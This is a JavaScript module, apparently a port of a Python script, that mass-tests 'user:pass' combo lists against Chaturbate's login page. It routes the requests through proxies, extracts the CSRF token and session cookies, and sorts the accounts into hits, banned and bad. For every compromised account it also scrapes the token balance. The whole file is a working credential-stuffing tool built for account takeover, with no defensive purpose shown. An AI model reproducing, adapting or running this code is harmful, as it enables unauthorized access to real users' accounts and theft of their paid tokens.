// ============================================================
//  Chaturbate Bruter — 1:1 port of main-4.py login logic
//  Uses proxiedFetch for proxy support + CSRF extraction.
//  Returns results array: { user, pass, status, balance }
// ============================================================

const { proxiedFetch } = require("./proxy-manager");
const { runQueue } = require("./account-queue");
const { logger } = require("./logger");

const log = logger.child("chaturbate-bruter");

const LOGIN_URL = "https://chaturbate.com/auth/login/";
const CSRF_RE = /name="csrfmiddlewaretoken" value="(.*?)"/;
const TOKEN_RE1 = /You have:.*?(\d+).*?Tokens/;
const TOKEN_RE2 = /<span class='tokencount'.*?>(.*?)<\/span>/;

/**
 * Brute-force a single Chaturbate account.
 * Returns: { user, pass, status, balance }
 *   status: "HIT" | "BANNED" | "BAD" | "RETRY"
 */
async function checkAccount(user, pass, signal) {
  // 1) GET login page → extract CSRF token
  const r1 = await proxiedFetch(LOGIN_URL, {
    signal,
    headers: {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    },
    redirect: "follow",
  });
  const html1 = await r1.text();
  const csrfMatch = html1.match(CSRF_RE);
  if (!csrfMatch) return { user, pass, status: "RETRY", balance: 0 };

  const csrf = csrfMatch[1];

  // Extract cookies from Set-Cookie header
  const setCookies = r1.headers.getSetCookie?.() || [];
  const cookieStr = setCookies.map((c) => c.split(";")[0]).join("; ");

  // 2) POST login — exact same payload as Python
  const body = new URLSearchParams({
    next: "/",
    csrfmiddlewaretoken: csrf,
    username: user,
    password: pass,
  });

  const r2 = await proxiedFetch(LOGIN_URL, {
    method: "POST",
    signal,
    headers: {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
      "Content-Type": "application/x-www-form-urlencoded",
      Referer: LOGIN_URL,
      Cookie: cookieStr,
    },
    body: body.toString(),
    redirect: "follow",
  });

  const html2 = await r2.text();
  const finalUrl = r2.url || "";

  // --- BAN DETECTION (exact same as Python) ---
  if (finalUrl.includes("/accounts/banned/") || html2.includes("Your Account Has Been Banned")) {
    const tm = html2.match(TOKEN_RE1);
    const balance = tm ? parseInt(tm[1]) : 0;
    return { user, pass, status: "BANNED", balance };
  }

  // --- SUCCESS DETECTION (sessionid in cookies) ---
  const resCookies = r2.headers.getSetCookie?.() || [];
  const hasSession = resCookies.some((c) => c.startsWith("sessionid="));

  if (hasSession) {
    let balance = 0;
    const tm1 = html2.match(TOKEN_RE1);
    if (tm1) {
      balance = parseInt(tm1[1]);
    } else {
      const tm2 = html2.match(TOKEN_RE2);
      if (tm2) balance = parseInt(tm2[1]);
    }
    return { user, pass, status: "HIT", balance };
  }

  // --- BAD (wrong creds) ---
  if (html2.includes("enter a correct username")) {
    return { user, pass, status: "BAD", balance: 0 };
  }

  return { user, pass, status: "RETRY", balance: 0 };
}

/**
 * Run bulk brute across combos.
 * @param {string[]} combos  "user:pass" lines
 * @param {number}   threads concurrency
 * @param {Function} onResult(done, total, result)
 * @param {AbortSignal} signal
 * @returns {Array<{user, pass, status, balance}>}
 */
async function bruteAccounts(combos, threads = 50, onResult, signal) {
  const results = await runQueue({
    items: combos,
    concurrency: threads,
    maxRetries: 3,
    signal,
    runner: async (combo, ctx) => {
      const idx = combo.indexOf(":");
      if (idx === -1) return { result: { user: combo, pass: "", status: "BAD", balance: 0 } };
      const user = combo.substring(0, idx).trim();
      const pass = combo.substring(idx + 1).trim();
      try {
        const r = await checkAccount(user, pass, ctx.signal);
        if (r.status === "RETRY") return { retry: true };
        return { result: r };
      } catch (err) {
        log.warn("brute crash", { user, err: err?.message });
        return { retry: true };
      }
    },
    onResult: (r, done, total) => {
      try { onResult?.(done, total, r); } catch {}
    },
  });

  return results.filter(Boolean);
}

module.exports = { bruteAccounts, checkAccount };
